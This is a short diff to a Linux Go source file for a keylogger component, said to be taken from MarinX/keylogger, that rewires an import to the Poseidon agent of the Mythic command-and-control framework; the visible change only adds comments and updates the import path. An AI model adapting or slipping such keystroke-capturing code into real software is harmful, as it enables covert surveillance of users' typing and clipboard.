@@ -1,9 +1,11 @@
 // +build linux
 
 // This is taken from MarinX/keylogger
+
 package keystate
 
 import (
+	// Standard
 	"bytes"
 	"encoding/binary"
 	"errors"
@@ -16,7 +18,8 @@ import (
 	"unicode"
 	"unsafe"
 
-	"keylog/clipboard"
+	// Poseidon
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/keylog/clipboard"
 )
 
 const (
